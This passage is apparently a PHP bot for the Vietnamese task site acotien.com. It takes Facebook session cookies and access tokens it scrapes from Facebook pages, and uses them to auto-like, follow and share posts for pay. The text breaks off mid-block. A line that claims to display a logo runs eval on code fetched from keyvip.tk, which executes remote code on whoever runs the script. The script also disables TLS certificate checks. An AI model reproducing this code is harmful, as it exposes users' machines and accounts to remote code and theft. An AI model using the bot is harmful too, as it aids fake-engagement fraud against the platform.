
error_reporting(0);
$end="\033[0m";
$whiteb="\033[1;37m";
$ress = "\033[0;32m";
$res = "\033[0;33m";
$red = "\033[0;31m";
$green = "\033[0;37m";
$yellow = "\033[0;33m";
$white = "\033[0;33m";
$xnhac = "\033[1;96m";
$den = "\033[1;90m";
$do = "\033[1;91m";
$luc = "\033[1;92m";
$vang = "\033[1;93m";
$xduong = "\033[1;94m";
$hong = "\033[1;95m";
$trang = "\033[1;97m";
$nenden = "\033[40m";
$xanhd = "\033[0;36m";
$nendo = "\033[41m";
$nenxanh = "\033[42m";
$nenvang = "\033[43m";
$nenblue = "\033[44m";
$nenPurpe = "\033[45m";
$nenCyan = "\033[46m";
$nentrang = "\033[47m";
$UGreen = "\033[4;32m";
$green="\033[1;32m";
$wait = $green."WAIT";
$res="\033[0m";
$red="\033[1;31m";
$yellow="\033[0;93m";
$lightblue="\033[1;35m";
$loai=[];
$bluelight="\033[1;34m";
$blue="\033[1;36m";
$purple="\e[35m";
system("clear");
echo "\033[1;31m[\033[1;32m●\033[1;31m]\033[1;37m =>\033[1;32m Tài Khoản: $vang ";
$tk=trim(fgets(STDIN));
echo "\033[1;31m[\033[1;32m●\033[1;31m]\033[1;37m =>\033[1;32m Mật Khẩu: $vang ";
$mk=trim(fgets(STDIN));
	$url='https://www.acotien.com/system/login';
	$ch=curl_init();
curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4 );
curl_setopt($ch, CURLOPT_TCP_FASTOPEN, true);
	curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_COOKIEJAR, "Acotien.txt");
curl_setopt($ch, CURLOPT_USERAGENT, $ua);
$login = 'user='.$tk.'&pass='.$mk;
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS,$login);
$log=curl_exec($ch);
$json2 = json_decode($log,true);
if (!file_exists('act.txt')){
	echo $green."Vui Lòng Thêm Cookie Vào File act.txt (Mỗi Cookie 1 Dòng)\n";
	exit();
	}else{
		$js = fread(fopen("act.txt","r"),filesize("act.txt"));
		if (empty($js)){
			echo $green."Vui Lòng Thêm Cookie Vào File act.txt (Mỗi Cookie 1 Dòng)\n";
			exit();
			}
$jsdec    = explode(PHP_EOL,$js);
$count=count($jsdec);
		}
	

$url = 'https://www.acotien.com/home';
$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_ENCODING, "");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_TIMEOUT, 30);
curl_setopt($ch, CURLOPT_USERAGENT, $ua);
curl_setopt($ch, CURLOPT_COOKIEFILE, 'Acotien.txt');
$bal1=curl_exec($ch);
$us=explode('class="font-semi-bold b200">', $bal1);
$username=explode('<', $us[1]);
$so=explode('Số dư: <b class="red">', $bal1);
$sodu=explode('<', $so[1]);
$cho=explode('Chờ duyệt</span> <h6 class="font-semi-bold pending_coin" style="font-size: 13px;">', $bal1);
$choduyet=explode('<', $cho[1])[0];
@system("clear");
eval(file_get_contents("https://keyvip.tk/logo.php"));
echo "\033[1;31m[\033[1;32m●\033[1;31m]\033[1;37m =>\033[1;32m Tên Tài Khoản:\033[1;36m $tk \n";
echo "\033[1;31m[\033[1;32m●\033[1;31m]\033[1;37m =>\033[1;32m Số Dư:\033[1;33m $sodu \n";
echo "\033[1;31m[\033[1;32m●\033[1;31m]\033[1;37m =>\033[1;32m Chờ Duyệt:\033[1;35m $choduyet \n";
echo "\e[1;32mLàm Nhiệm Vụ Like\e\033[37m( y/n) : $vang ";
$testlike=trim(fgets(STDIN));
echo "\e[1;32mLàm Nhiệm Vụ Follow\e\033[37m( y/n) : $vang ";
$testfl=trim(fgets(STDIN));
echo "\e[1;32mLàm Nhiệm Vụ Like Page\e\033[37m( y/n) : $vang ";
$testpage=trim(fgets(STDIN));
echo "\e[1;32mLàm Nhiệm Vụ Cảm Xúc\e\033[37m( y/n) : $vang ";
$testcx=trim(fgets(STDIN));
echo "\e[1;32mLàm Nhiệm Vụ Share\e\033[37m( y/n) : $vang ";
$testshare=trim(fgets(STDIN));
echo "\e[1;32mDelay Nhiệm Vụ : $vang ";
$delay=trim(fgets(STDIN));
$jobsck=99999;
if ($delay < 1){
	echo $red."Không Được Dưới 1 Giây";
	exit();
	}
	if ($testlike=='y'){
	array_push($loai, 'LIKE');
	}
	if ($testfl=='y'){
	array_push($loai, 'FOLLOW');
	}
	if ($testpage=='y'){
	array_push($loai, 'PAGE');
	}
	if ($testcx=='y'){
	array_push($loai, 'CX');
	}
	if ($testshare=='y'){
	array_push($loai, 'SHARE');
	}
echo $vang."=====================================================\n";
while (true){
	foreach ($jsdec as $cookiefb){
		$chuyenacc=0;
		  $ch=curl_init();
curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4 );
curl_setopt($ch, CURLOPT_TCP_FASTOPEN, true);
curl_setopt($ch, CURLOPT_URL, 'https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed');
$head[] = "Connection: keep-alive";
$head[] = "Keep-Alive: 300";
$head[] = "authority: m.facebook.com";
$head[] = "ccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7";
$head[] = "accept-language: vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5";
$head[] = "cache-control: max-age=0";
$head[] = "upgrade-insecure-requests: 1";
$head[] = "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9";
$head[] = "sec-fetch-site: none";
$head[] = "sec-fetch-mode: navigate";
$head[] = "sec-fetch-user: ?1";
$head[] = "sec-fetch-dest: document";
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36');
curl_setopt($ch, CURLOPT_ENCODING, '');
curl_setopt($ch, CURLOPT_COOKIE, $cookiefb);
curl_setopt($ch, CURLOPT_HTTPHEADER, $head);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
curl_setopt($ch, CURLOPT_TIMEOUT, 60);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 60);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
curl_setopt($ch, CURLOPT_HTTPHEADER, array('Expect:'));
$access = curl_exec($ch);
curl_close($ch);
if (explode('\",\"useLocalFilePreview',explode('accessToken\":\"', $access)[1])[0]){
$access_token = explode('\",\"useLocalFilePreview',explode('accessToken\":\"', $access)[1])[0];
}
if(json_decode(file_get_contents('https://graph.facebook.com/me/?access_token='.$access_token))->{'id'}){
	$idfb = json_decode(file_get_contents('https://graph.facebook.com/me/?access_token='.$access_token))->{'id'};	
}else{
}
if(json_decode(file_get_contents('https://graph.facebook.com/me/?access_token='.$access_token))->{'name'}){
	$name = json_decode(file_get_contents('https://graph.facebook.com/me/?access_token='.$access_token))->{'name'};	
}
		
		$urldat = 'https://www.acotien.com/system/dat-nick';
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $urldat);
curl_setopt($ch, CURLOPT_ENCODING, "");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_TIMEOUT, 30);
$data = "iddat=$idfb";

curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch, CURLOPT_COOKIEFILE, 'Acotien.txt');
$dat=curl_exec($ch);
$json2 = json_decode($dat,true);
		if ($json2["status"] !== true){
			exit("Vui Lòng Cấu Hình Nick");
			}else{
				echo $res."~ ".$green."🌍 Tên FB : $name\n";
				}
				
				while (true){
$url = 'https://www.acotien.com/kiem-tien';
$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_ENCODING, "");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_TIMEOUT, 30);
curl_setopt($ch, CURLOPT_COOKIEFILE, 'Acotien.txt');
$bal1=curl_exec($ch);
$ty=explode('<div class="col pr-0"> <span class="font-14 block-text-2">', $bal1);
$type=explode(' </span>', $ty[1])[0];
$pr=explode('<span class="hold-prices">', $bal1);
$price=explode('</span>', $pr[1])[0];

if (strpos($bal1, 'Hiện không có nhiệm vụ nào mới hoặc bạn chưa chọn nick làm nhiệm vụ.') !== false){
	sleep(5);
$url = 'https://www.acotien.com/kiem-tien';
$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_ENCODING, "");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_TIMEOUT, 30);
curl_setopt($ch, CURLOPT_COOKIEFILE, 'Acotien.txt');
$bal1=curl_exec($ch);
$ty=explode('<div class="col pr-0"> <span class="font-14 block-text-2">', $bal1);
$type=explode(' </span>', $ty[1])[0];
$pr=explode('<span class="hold-prices">', $bal1);
$price=explode('</span>', $pr[1])[0];
if (strpos($bal1, 'Hiện không có nhiệm vụ nào mới hoặc bạn chưa chọn nick làm nhiệm vụ.') !== false){
$key = array_search($cookiefb, $jsdec);
    unset($jsdec[$key]);
echo $res."~ ".$green." Đã Xoá Cookie Ra Khỏi Acc Đang Chạy (Hết NV)             \n";
	}}else{

$count=count($jsdec);
if ($count=='0'){
	exit($res."~ ".$green."Tất Cả Các Nick Đã Hết NV\n");
	}
	if ($type=='Thực hiện theo dõi cho bài viết'){
$id2=explode("follow('", $bal1);
$id=explode("'", $id2[1])[0];
}else{
	$id2=explode("like('", $bal1);
$id=explode("'", $id2[1])[0];
	}
if ($type=='Thực hiện like cho bài viết' && in_array('LIKE', $loai)){
	$id2=explode("like('", $bal1);
$id=explode("'", $id2[1])[0];
echo $res."~".$red."[".$blue.date("h:i").$red."][".$green."Thực Hiện Like Cho Bài Viết".$red."]".$res." =>".$green." $id".$red."\r";
$ch=curl_init();
curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4 );
curl_setopt($ch, CURLOPT_TCP_FASTOPEN, true);
	$linkid='https://mbasic.facebook.com/'.$id;
$ch = @curl_init();
curl_setopt($ch, CURLOPT_URL, $linkid);
$head[] = "Connection: keep-alive";
$head[] = "Keep-Alive: 300";
$head[] = "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7";
$head[] = "Accept-Language: en-us,en;q=0.5";
curl_setopt($ch, CURLOPT_USERAGENT, 'Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14');
curl_setopt($ch, CURLOPT_ENCODING, '');
curl_setopt($ch, CURLOPT_COOKIE, $cookiefb);
curl_setopt($ch, CURLOPT_HTTPHEADER, $head);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
curl_setopt($ch, CURLOPT_TIMEOUT, 60);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 60);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
curl_setopt($ch, CURLOPT_HTTPHEADER, array('Expect
:'));
$page = curl_exec($ch);
if (strpos($page, "xs=deleted") == true) {
        exit("$res ~".$yellow."[".$red."×".$yellow."]".$res." =>".$red." Die Cookie !!!\n");
}
preg_match('#href="/a/like.php?(.+?)"#is', $page, $_link);
$link= html_entity_decode('https://mbasic.facebook.com/a/like.php'.$_link[1]);
curl_setopt($ch, CURLOPT_URL, $link);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_exec($ch);
curl_close($ch);
	
	$ch=curl_init();
curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4 );
curl_setopt($ch, CURLOPT_TCP_FASTOPEN, true);
curl_setopt($ch, CURLOPT_URL, 'https://www.acotien.com/system/nhan-tien-like');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_USERAGENT, $ua);
$get="id=".$id;
curl_setopt($ch, CURLOPT_POST,$get);
curl_setopt($ch, CURLOPT_POSTFIELDS,$get);
curl_setopt($ch, CURLOPT_COOKIEFILE, "Acotien.txt");
$xu=curl_exec($ch);
curl_close($ch);

$getmn=json_decode($xu,true);

if ($getmn["msg"] == 'Bạn đã thực hiện thành công, tiền đã được cộng vào tài khoản.'){
$chuyenacc++;
	$dem++;
	$url = 'https://www.acotien.com/home';
$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_ENCODING, "");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_TIMEOUT, 30);

curl_setopt($ch, CURLOPT_COOKIEFILE, 'Acotien.txt');
$bal1=curl_exec($ch);
$so=explode('Số dư: <b class="red">', $bal1);
$sodu=explode('<', $so[1])[0];
$cho=explode('Chờ duyệt</span> <h6 class="font-semi-bold pending_coin" style="font-size: 13px;">', $bal1);
$choduyet=explode('<', $cho[1])[0];
	echo $res."~".$red."[".$blue.date("h:i").$red."][".$green."Thực Hiện Like Cho Bài Viết".$red."]".$res." =>".$green." $id".$red."\n";
echo $res."~".$red."[".$blue.date("h:i").$red."][".$green."TIỀN JOB".$red."]".$res." =>".$green." +".$price."₫".$red."\n";
echo $res."~".$red."[".$blue.date("h:i").$red."][".$green."ACOTIEN".$red."]".$res." =>".$green." ".$getmn["msg"]."\n";
echo $res."~".$red."[".$blue.date("h:i").$red."][".$green."SỐ DƯ".$red."]".$res." =>".$green." $sodu\n";
echo $res."~".$red."[".$blue.date("h:i").$red."][".$green."Chờ Duyệt".$red."]".$res." =>".$green." $choduyet\n";
echo $res."~".$red."[".$blue.date("h:i").$red."][".$green."Số Job Đã Làm Trong Tool".$red."]".$res." =>".$green." $dem\n";
	for ($makep=38;$makep > 0;$makep--){
echo $res."-";
usleep(2500);
echo $red."-";
}
echo "\n";
	for ($time=$delay;$time>-1;$time--)
{ 
   echo "\r\033[1;93m•Đợi Đạt Xíu Nhé (+_+)\033[1;91m 👉       \033[1;92m N      \033[1;91m |\033[1;93m $time\033[1;91m | ";
        usleep(150000);

        echo "\r\033[1;91m•Đợi Đạt Xíu Nhé (+_+)\033[0;33m   👉     \033[0;37m NT     \033[0;31m |\033[0;33m $time\033[0;31m | ";
        usleep(150000);
        echo "\r\033[1;92m•Đợi Đạt Xíu Nhé (+_+)\033[0;33m     👉   \033[0;37m NTĐ  \033[0;31m |\033[0;33m $time\033[0;31m | ";
        usleep(150000);
        echo "\r\033[1;94m•Đợi Đạt Xíu Nhé (+_+)\033[0;33m       👉 \033[0;37m NTĐ   .\033[0;31m |\033[0;33m $time\033[0;31m | ";
        usleep(150000);
        echo "\r\033[1;95m•Đợi Đạt Xíu Nhé (+_+)\033[0;33m        👉\033[0;37m NTĐ... \033[0;31m |\033[0;33m $time\033[0;31m | ";
        usleep(150000);
        echo "\r\033[1;95m•Đợi Đạt Xíu Nhé (+_+)\033[0;33m        👉\033[0;37m NTĐ.... \033[0;31m |\033[0;33m $time\033[0;31m | ";
        usleep(150000);
        echo "\r\033[1;95m•Đợi Đạt Xíu Nhé (+_+)\033[0;33m        👉\033[0;37m NTĐ.....\033[0;31m |\033[0;33m $time\033[0;31m | ";
        usleep(100000);
        echo "\r                                          \r";
}
echo "$res                                  \r";
}

}











if ($type=='Thực hiện like page' && in_array('PAGE', $loai)){
	
	$id2=explode("like('", $bal1);
$id=explode("'", $id2[1])[0];
	echo $res."~".$red."[".$blue.date("h:i").$red."][".$green."Thực Hiện Like Page Cho Page".$red."]".$res." =>".$green." $id".$red."\r";
$linkid='https://mbasic.facebook.com/profile.php?id='.$id;
$ch = @curl_init();
curl_setopt($ch, CURLOPT_URL, $linkid);
$head[] = "Connection: keep-alive";
$head[] = "Keep-Alive: 300";
$head[] = "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7";
$head[] = "Accept-Language: en-us,en;q=0.5";
curl_setopt($ch, CURLOPT_USERAGENT, 'Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14');
curl_setopt($ch, CURLOPT_ENCODING, '');
curl_setopt($ch, CURLOPT_COOKIE, $cookiefb);
curl_setopt($ch, CURLOPT_HTTPHEADER, $head);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
curl_setopt($ch, CURLOPT_TIMEOUT, 60);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 60);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
curl_setopt($ch, CURLOPT_HTTPHEADER, array('Expect
:'));
$page = curl_exec($ch);
//fl
preg_match('#href="/a/profile.php?(.+?)"#is', $page, $_link);
$link= html_entity_decode('https://mbasic.facebook.com/a/profile.php'.$_link[1]);
curl_setopt($ch, CURLOPT_URL, $link);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_exec($ch);
curl_close($ch);

$ch=curl_init();
curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4 );
curl_setopt($ch, CURLOPT_TCP_FASTOPEN, true);
curl_setopt($ch, CURLOPT_URL, 'https://www.acotien.com/system/nhan-tien-page');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_USERAGENT, $ua);
$get="id=".$id;
curl_setopt($ch, CURLOPT_POST,$get);
curl_setopt($ch, CURLOPT_POSTFIELDS,$get);
curl_setopt($ch, CURLOPT_COOKIEFILE, "Acotien.txt");
$xu=curl_exec($ch);
curl_close($ch);

$getmn=json_decode($xu,true);

if ($getmn["msg"] == 'Bạn đã thực hiện thành công, tiền đã được cộng vào tài khoản.'){
$chuyenacc++;
	$dem++;
	$url = 'https://www.acotien.com/kiem-tien';
$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_ENCODING, "");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_TIMEOUT, 30);

curl_setopt($ch, CURLOPT_COOKIEFILE, 'Acotien.txt');
$bal1=curl_exec($ch);
$so=explode('Số dư: <b class="red">', $bal1);
$sodu=explode('<', $so[1])[0];
$cho=explode('Chờ duyệt</span> <h6 class="font-semi-bold pending_coin" style="font-size: 13px;">', $bal1);
$choduyet=explode('<', $cho[1])[0];
	echo $res."~".$red."[".$blue.date("h:i").$red."][".$green."Thực Hiện Like Page Cho Page".$red."]".$res." =>".$green." $id".$red."\n";
echo $res."~".$red."[".$blue.date("h:i").$red."][".$green."TIỀN JOB".$red."]".$res." =>".$green." +".$price."₫".$red."\n";
echo $res."~".$red."[".$blue.date("h:i").$red."][".$green."ACOTIEN".$red."]".$res." =>".$green." ".$getmn["msg"]."\n";
echo $res."~".$red."[".$blue.date("h:i").$red."][".$green."SỐ DƯ".$red."]".$res." =>".$green." $sodu\n";
echo $res."~".$red."[".$blue.date("h:i").$red."][".$green."Chờ Duyệt".$red."]".$res." =>".$green." $choduyet\n";
echo $res."~".$red."[".$blue.date("h:i").$red."][".$green."Số Job Đã Làm Trong Tool".$red."]".$res." =>".$green." $dem\n";
	for ($makep=38;$makep > 0;$makep--){
echo $res."-";
usleep(2500);
echo $red."-";
}
echo "\n";
	for ($time=$delay;$time>-1;$time--)
{ 
echo "\r".$res."~".$red."[".$yellow."|".$red."]$blue Vui Lòng Đợi  $time      \r";
usleep(125000);
echo "\r".$res."~".$red."[".$yellow."/".$red."]$blue Vui Lòng Đợi $time        \r";
usleep(125000);
echo "\r".$res."~".$red."[".$yellow."-".$red."]$blue Vui Lòng Đợi $time          \r";
usleep(125000);
echo "\r".$res."~".$red."[".$yellow."\\".$red."]".$red."$blue Vui Lòng Đợi $time          \r";
usleep(125000);
echo "\r".$res."~".$red."[".$yellow."|".$red."]$blue Vui Lòng Đợi $time          \r";
usleep(125000);
echo "\r".$res."~".$red."[".$yellow."/".$red."]$blue Vui Lòng Đợi $time          \r";
usleep(125000);
echo "\r".$res."~".$red."[".$yellow."-".$red."]$blue Vui Lòng Đợi $time          \r";
usleep(125000);
echo "\r".$res."~".$red."[".$yellow."\\".$red."]".$red."$blue Vui Lòng Đợi $time          \r";
usleep(125000);
}
echo "$res                                  \r";
}
}
if ($type=='Thực hiện theo dõi' && in_array('FOLLOW', $loai)){
$id2=explode("follow('", $bal1);
$id=explode("'", $id2[1])[0];
echo $res."~".$red."[".$blue.date("h:i").$red."][".$green."Thực Hiện Follow Cho Trang Cá Nhân".$red."]".$res." =>".$green." $id".$red."\r";
$linkid='https://mbasic.facebook.com/profile.php?id='.$id;
$ch = @curl_init();
curl_setopt($ch, CURLOPT_URL, $linkid);
$head[] = "Connection: keep-alive";
$head[] = "Keep-Alive: 300";
$head[] = "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7";
$head[] = "Accept-Language: en-us,en;q=0.5";
curl_setopt($ch, CURLOPT_USERAGENT, 'Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14');
curl_setopt($ch, CURLOPT_ENCODING, '');
curl_setopt($ch, CURLOPT_COOKIE, $cookie);
curl_setopt($ch, CURLOPT_HTTPHEADER, $head);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
curl_setopt($ch, CURLOPT_TIMEOUT, 60);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 60);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
curl_setopt($ch, CURLOPT_HTTPHEADER, array('Expect
:'));
$page = curl_exec($ch);
if (strpos($page, "xs=deleted") == true) {
        exit("$res ~".$yellow."[".$red."×".$yellow."]".$res." =>".$red." Die Cookie !!!\n");
}
if(strpos($page,'Để bảo vệ cộng đồng khỏi spam, chúng tôi giới hạn tần suất bạn đăng bài, bình luận hoặc làm các việc khác trong khoảng thời gian nhất định. Bạn có thể thử lại sau')){
	exit("$res ~".$yellow."[".$red."×".$yellow."]".$res." =>".$red." Nick Đã Bị Block Tính Năng Hãy Chuyển Chức Năng Khác !!!\n");
	}
preg_match('#href="/a/subscribe.php?(.+?)"#is', $page, $_link);
$link= html_entity_decode('https://mbasic.facebook.com/a/subscribe.php'.$_link[1]);
curl_setopt($ch, CURLOPT_URL, $link);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$fl=curl_exec($ch);
curl_close($ch);

$ch=curl_init();
curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4 );
curl_setopt($ch, CURLOPT_TCP_FASTOPEN, true);
curl_setopt($ch, CURLOPT_URL, 'https://www.acotien.com/system/nhan-tien-follow');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_USERAGENT, $ua);
$get="id=".$id;
curl_setopt($ch, CURLOPT_POST,$get);
curl_setopt($ch, CURLOPT_POSTFIELDS,$get);
curl_setopt($ch, CURLOPT_COOKIEFILE, "Acotien.txt");
$xu=curl_exec($ch);
curl_close($ch);

$getmn=json_decode($xu,true);

if ($getmn["msg"] == 'Bạn đã thực hiện thành công, tiền đã được cộng vào tài khoản.'){
$chuyenacc++;
	$dem++;
	$url = 'https://www.acotien.com/home';
$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_ENCODING, "");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_TIMEOUT, 30);

curl_setopt($ch, CURLOPT_COOKIEFILE, 'Acotien.txt');
$bal1=curl_exec($ch);
$so=explode('Số dư: <b class="red">', $bal1);
$sodu=explode('<', $so[1])[0];
$cho=explode('Chờ duyệt</span> <h6 class="font-semi-bold pending_coin" style="font-size: 13px;">', $bal1);
$choduyet=explode('<', $cho[1])[0];
	echo $res."~".$red."[".$blue.date("h:i").$red."][".$green."Thực Hiện Follow Cho Trang Cá Nhân".$red."]".$res." =>".$green." $id".$red."\n";
echo $res."~".$red."[".$blue.date("h:i").$red."][".$green."TIỀN JOB".$red."]".$res." =>".$green." +".$price."₫".$red."\n";
echo $res."~".$red."[".$blue.date("h:i").$red."][".$green."ACOTIEN".$red."]".$res." =>".$green." ".$getmn["msg"]."\n";
echo $res."~".$red."[".$blue.date("h:i").$red."][".$green."SỐ DƯ".$red."]".$res." =>".$green." $sodu\n";
echo $res."~".$red."[".$blue.date("h:i").$red."][".$green."Chờ Duyệt".$red."]".$res." =>".$green." $choduyet\n";
echo $res."~".$red."[".$blue.date("h:i").$red."][".$green."Số Job Đã Làm Trong Tool".$red."]".$res." =>".$green." $dem\n";
	for ($makep=38;$makep > 0;$makep--){
echo $res."-";
usleep(2500);
echo $red."-";
}
echo "\n";
	for ($time=$delay;$time>-1;$time--)
{ 
echo "\r".$res."~".$red."[".$yellow."|".$red."]$blue Vui Lòng Đợi  $time      \r";
usleep(125000);
echo "\r".$res."~".$red."[".$yellow."/".$red."]$blue Vui Lòng Đợi $time        \r";
usleep(125000);
echo "\r".$res."~".$red."[".$yellow."-".$red."]$blue Vui Lòng Đợi $time          \r";
usleep(125000);
echo "\r".$res."~".$red."[".$yellow."\\".$red."]".$red."$blue Vui Lòng Đợi $time          \r";
usleep(125000);
echo "\r".$res."~".$red."[".$yellow."|".$red."]$blue Vui Lòng Đợi $time          \r";
usleep(125000);
echo "\r".$res."~".$red."[".$yellow."/".$red."]$blue Vui Lòng Đợi $time          \r";
usleep(125000);
echo "\r".$res."~".$red."[".$yellow."-".$red."]$blue Vui Lòng Đợi $time          \r";
usleep(125000);
echo "\r".$res."~".$red."[".$yellow."\\".$red."]".$red."$blue Vui Lòng Đợi $time          \r";
usleep(125000);
}
echo "$res                                  \r";
}
}

if ($type=='Thực hiện chia sẻ cho bài viết' && in_array('SHARE', $loai)){
	$id2=explode("like('", $bal1);
$id=explode("'", $id2[1])[0];
echo $res."~".$red."[".$blue.date("h:i").$red."][".$green."Thực Hiện Share Cho Bài Viết".$red."]".$res." =>".$green." $id".$red."\r";
	$url="https://graph.facebook.com/me/feed?method=post&access_token=".$access_token."&link=https://facebook.com/".$id;
	$ch=curl_init();
curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4 );
curl_setopt($ch, CURLOPT_TCP_FASTOPEN, true);
	curl_setopt($ch, CURLOPT_URL, $url);
	$head[] = "Connection: keep-alive";
	$head[] = "Keep-Alive: 300";
	$head[] = "authority: m.facebook.com";
	$head[] = "ccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7";
	$head[] = "accept-language: vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5";
	$head[] = "cache-control: max-age=0";
	$head[] = "upgrade-insecure-requests: 1";
	$head[] = "sec-fetch-site: none";
	$head[] = "sec-fetch-mode: navigate";
	$head[] = "sec-fetch-user: ?1";
	$head[] = "sec-fetch-dest: document";
	curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36');
	curl_setopt($ch, CURLOPT_ENCODING, '');
	curl_setopt($ch, CURLOPT_COOKIE, $cookiefb);
	curl_setopt($ch, CURLOPT_HTTPHEADER, $head);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
	curl_setopt($ch, CURLOPT_TIMEOUT, 60);
	curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 60);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
	curl_setopt($ch, CURLOPT_HTTPHEADER, array('Expect:'));
	$data = array('access_token' => $access_token);
	curl_setopt($ch, CURLOPT_POST,count($data));
	curl_setopt($ch, CURLOPT_POSTFIELDS,$data);
	$access = curl_exec($ch);
	curl_close($ch);
	
	$ch=curl_init();
curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4 );
curl_setopt($ch, CURLOPT_TCP_FASTOPEN, true);
curl_setopt($ch, CURLOPT_URL, 'https://www.acotien.com/system/nhan-tien-cam-xuc');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_USERAGENT, $ua);
$get="id=".$id."&loaicx=".$type;
curl_setopt($ch, CURLOPT_POST,$get);
curl_setopt($ch, CURLOPT_POSTFIELDS,$get);
curl_setopt($ch, CURLOPT_COOKIEFILE, "Acotien.txt");
$xu=curl_exec($ch);
curl_close($ch);

$getmn=json_decode($xu,true);

if ($getmn["msg"] == 'Bạn đã thực hiện thành công, tiền đã được cộng vào tài khoản.'){
$chuyenacc++;
